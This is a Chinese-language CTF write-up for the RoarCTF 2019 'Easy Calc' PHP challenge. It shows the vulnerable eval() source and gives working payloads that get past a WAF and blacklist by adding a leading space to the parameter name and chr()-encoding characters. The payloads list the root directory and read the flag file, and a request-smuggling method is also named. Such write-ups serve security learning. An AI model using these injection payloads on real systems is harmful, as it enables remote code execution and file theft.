# 绕过WAF ？？？

[BUUCTF在线评测](https://buuoj.cn/challenges#[RoarCTF 2019]Easy Calc) 

```php+HTML
<?php
error_reporting(0);
if(!isset($_GET['num'])){
    show_source(__FILE__);
}else{
        $str = $_GET['num'];
        $blacklist = [' ', '\t', '\r', '\n','\'', '"', '`', '\[', '\]','\$','\\','\^'];
        foreach ($blacklist as $blackitem) {
                if (preg_match('/' . $blackitem . '/m', $str)) {
                        die("what are you want to do?");
                }
        }
        eval('echo '.$str.';');
}
?>
```

- **chr() 函数**：从指定的 ASCII 值返回字符。 ASCII 值可被指定为十进制值、八进制值或十六进制值。八进制值被定义为带前置0，而十六进制值被定义为带前置 0x。
- **file_get_contents() 函数：**把整个文件读入一个字符串中。该函数是用于把文件的内容读入到一个字符串中的首选方法。如果服务器操作系统支持，还会使用内存映射技术来增强性能。
- **PHP的字符串解析特性：**PHP需要将所有参数转换为有效的变量名，因此在解析查询字符串时，它会做两件事：1.删除空白符 2.将某些字符转换为下划线（包括空格）【当waf不让你过的时候，php却可以让你过】。假如**waf不允许num变量传递字母，可以在num前加个空格，这样waf就找不到num这个变量了**，因为现在的变量叫“ num”，而不是“num”。**但php在解析的时候，会先把空格给去掉**，这样我们的代码还能正常运行，还上传了非法字符。
- **scandir() 函数：**返回指定目录中的文件和目录的数组。

![在这里插入图片描述](https://i-blog.csdnimg.cn/blog_migrate/c462a71e946d03e20bb81f2913a1d128.png)

### 方法一：PHP的字符串解析特性

num前加个空格：`/calc.php? num=phpinfo()`    (这句话试探一下能不能被正常读取)

由于“/”被过滤了，所以我们可以使用chr(47)来进行表示，进行目录读取：
`calc.php? num=1;var_dump(scandir(chr(47)))`

![在这里插入图片描述](https://i-blog.csdnimg.cn/blog_migrate/95a476c38aadc434277a1555565b64c5.png)

构造：`/flagg——chr(47).chr(102).chr(49).chr(97).chr(103).chr(103)`
payload：`calc.php? num=1;var_dump(file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103)))`

### 方法二：http走私攻击

构造：`/flagg——chr(47).chr(102).chr(49).chr(97).chr(103).chr(103)`
payload：`/calc.php?num=file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103))`


![在这里插入图片描述](https://i-blog.csdnimg.cn/blog_migrate/7259d6bd06b9048b630a90c4520fb957.png)

### 知识点：file_get_contents() 

**语法：**

```
file_get_contents(path,include_path,context,start,max_length)
```

| 参数         | 描述                                                         |
| ------------ | ------------------------------------------------------------ |
| path         | 必需。规定要读取的文件。                                     |
| include_path | 可选。如果您还想在 include_path（在 php.ini 中）中搜索文件的话，请设置该参数为 '1'。 |
| context      | 可选。规定文件句柄的环境。context 是一套可以修改流的行为的选项。若使用 NULL，则忽略。 |
| start        | 可选。规定在文件中开始读取的位置。                           |
| max_length   | 可选。规定读取的字节数。                                     |

**！！！该函数是二进制安全的。（意思是二进制数据（如图像）和字符数据都可以使用此函数写入。）**

```php
<?php
echo file_get_contents("test.txt");
?>
    
    This is a test file with test text.
```

